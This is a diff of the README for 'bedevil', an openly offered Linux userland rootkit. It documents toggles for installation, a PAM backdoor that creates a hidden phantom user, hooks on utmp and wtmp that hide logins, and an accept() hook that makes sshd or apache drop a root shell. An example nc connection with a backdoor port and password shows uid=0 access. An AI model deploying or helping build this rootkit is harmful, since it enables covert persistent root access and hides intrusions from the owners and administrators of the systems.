@@ -16,8 +16,8 @@ Ultimately my core aim is to tidy up the project, fix outstanding issues and org
  * [__prehook.c__](https://github.com/naworkcaj/bdvl/blob/master/inc/prehook.c): constructor and destructor for the rootkit
 
 *(inc/\*)* (header include directories may have their own exclusive files)
- * [__char_arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/char_arrays): a list of char arrays to write, with their respective array elements
- * [__consts__](https://github.com/naworkcaj/bdvl/blob/master/inc/consts): background consts that the user doesn't really need to see
+ * __char_arrays__: list of char arrays to write, with their respective array elements
+ * __consts__: background consts that the user doesn't really need to see
 
  *(examples)*
  * [__inc/hooks/libdl/char_arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/libdl/char_arrays)
@@ -54,7 +54,6 @@ $ ./bedevil.sh -h
           -D: Install all potentially required dependencies. (REQUIRES ROOT)
           -i: Launch installation. (REQUIRES ROOT)
 
-
 ```
  * *Compile only (no installation):* `./bedevil.sh -C(t)dbc` (will quickly compile the .so in the your cwd)  
  * *Changing variable values (example):* `BD_UNAME=... BD_PWD=... ./bedevil.sh -Cdbc`  
@@ -63,7 +62,7 @@ $ ./bedevil.sh -h
 </hr>
 
 ## Rootkit toggles
- * [`inc/toggles.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you can control what bedevil can do upon installation. Comments available.  
+ * [`inc/toggles.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you have more control what bedevil can & will do upon installation. Comments available.  
  * [`etc/toggles.sh`](https://github.com/naworkcaj/bdvl/blob/master/etc/toggles.sh) is used by bedevil.sh to read, parse, and make changes to toggles.h without manual editing.
 
 | Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
@@ -112,7 +111,7 @@ bedevil logs successful authentication attempts on the box it is installed on, b
 </hr>
 
 ## Backdoor
-Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section at the beginning of this README. There is a README inside the rootkit's installation directory that you may wish to consult from a backdoor shell. *([this](https://github.com/naworkcaj/bdvl/blob/master/etc/README))*
+Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section at the beginning of this README. There is a README inside the rootkit's installation directory that you may wish to consult from a backdoor shell. *([this](https://github.com/naworkcaj/bdvl/blob/master/etc/README))*  
 
 ### PAM
 By hijacking libpam's authentication functions, we can create a phantom user on the machine that can be logged into just the same as any other user.
@@ -124,37 +123,34 @@ See [etc/ssh.sh](https://github.com/naworkcaj/bdvl/blob/master/etc/ssh.sh) on co
 By hooking all of the responsible utmp & wtmp functions, any information that may give off indication of a PAM backdoor is throttled.  
 see utmp/[putut.c](https://github.com/naworkcaj/bdvl/blob/master/inc/utmp/putut.c)*
 
-#### Pros
- * Secure connection over ssh
- * Interactive shell
-
-#### Cons
- * wtmp and utmp logs need hidden
- * PAM logins can be disabled
+| Pros                        | Cons                           |
+| :-------------------------- | :----------------------------- |
+| secure connection over ssh  | wtmp and utmp logs need hidden |
+| interactive shell           | PAM logins can be disabled     |
 
 ### accept() hook
-By hijacking libc's accept(), we can essentially backdoor existing services on a box, such as sshd or apache, and have them drop us a shell, if conditions are met.  
-While setting up your installation of bedevil, you'll set a backdoor password, and your accept backdoor port which will trigger bedevil drop you a shell. Using this information, you will be able to connect to your box and access a backdoor shell. (the trigger port will also be hidden if it's in `hide_ports`)  
-i.e.: (where `ACCEPT_PORT` is 839 & `BD_PWD` is 'my_password')
+ * By intercepting and hijacking libc's accept(), we can connect to existing services on ports on a box and have them drop us a reverse shell if conditions are met.
+ * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
+ * `ACCEPT_PORT` is automatically a hidden port in `'hide_ports'`.
+
+#### SSL
+ * If you are using the accept hook backdoor w/ SSL enabled, the SSL backdoor source port is `$ACCEPT_PORT + 1`.  
+ * The plaintext backdoor source port is still available to use even when you have enabled `ACCEPT_USE_SSL`.*
+
+#### Example connection to infected box
+*where the host is `213.82.46.164` `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*
 ```
-$ nc 127.0.0.1 22 -p 839
+$ nc 213.82.46.164 22 -p 839
 my_password
 ...
 uid=0(root) gid=666 groups=666
 ...
 ```
- * If you are using the accept hook backdoor w/ SSL enabled, the SSL backdoor source port is `$ACCEPT_PORT + 1`.  
- * The plaintext backdoor source port is still available to use even when you have enabled `ACCEPT_USE_SSL`.*
 
-#### Pros
- * Not as much need to worry about logs
- * Fast
+| Pros                                         | Cons                                    |
+| :------------------------------------------- | :-------------------------------------- |
+| not as much need to worry about logs         | plaintext unless using SSL              |
+| fast                                         | not an interactive shell. but can be    |
+| doesn't require miscellaneous backdoor files | requires services running on open ports |
 
-#### Cons
- * Not an interactive shell
- * Plaintext communications
-
-</hr>
-
-### Notes
- * `while true; do ldd /bin/echo; done` :<
+<!-- `while true; do ldd /bin/echo; done` :< -->
